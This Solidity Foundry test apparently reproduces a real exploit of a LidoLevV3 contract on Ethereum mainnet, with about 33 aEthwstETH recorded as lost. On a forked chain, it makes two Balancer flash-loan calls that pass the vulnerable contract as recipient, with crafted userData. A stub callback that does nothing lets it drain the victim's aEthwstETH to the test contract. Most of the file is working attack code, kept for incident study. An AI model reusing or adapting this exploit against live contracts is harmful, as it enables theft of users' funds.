// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    @KeyInfo
    - Total Lost: 33 $aEthwstETH
    - Attacker: https://etherscan.io/address/0x09f6be2a7d0d2789f01ddfaf04d4eaa94efc0857
    - Attack Contract: https://etherscan.io/address/0x12d85e5869258a80d4bebe70d176d0f58b2d68e4
    - Vuln Contract: https://etherscan.io/address/0xcd6ca2f0d0c182c5049d9a1f65cde51a706ae142
    - Attack Tx: https://phalcon.blocksec.com/explorer/tx/eth/0x03543ef96c26d6c79ff6c24219c686ae6d0eb5453b322e54d3b6a5ce456385e5
    - Analysis: https://twitter.com/Phalcon_xyz/status/1753020812284809440
*/

interface IBalancer {
    function flashLoan(IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

contract ExploitTest is Test {
    address aEthwstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    address Balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address LidoLevV3 = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 19_132_935 - 1);
        cheats.label(address(aEthwstETH), "aEthwstETH");
        cheats.label(address(Balancer), "Balancer");
        cheats.label(address(LidoLevV3), "LidoLevV3");
    }

    function testExploit() external {
        emit log_named_decimal_uint(
            "Exploiter aEthwstETH balance before attack",
            IERC20(aEthwstETH).balanceOf(address(this)),
            IERC20(aEthwstETH).decimals()
        );


        bytes memory userencodeData = abi.encode(1, address(this));
        bytes memory userencodeData2 = abi.encode(2, address(this));
        uint256[] memory amount = new uint256[](1);
        uint256[] memory amount2 = new uint256[](1);
        IERC20[] memory token = new IERC20[](1);

        token[0] = IERC20(WETH);
        amount[0] = 318973831042619036856;
        amount2[0] = 0;
        IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount, userencodeData);
        IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount2, userencodeData2);

        emit log_named_decimal_uint(
            "Exploiter aEthwstETH balance after attack",
            IERC20(aEthwstETH).balanceOf(address(this)),
            IERC20(aEthwstETH).decimals()
        );
    }

    function createAaveDebt(uint256 wethAmount) external {
        // do nothing
    }
}
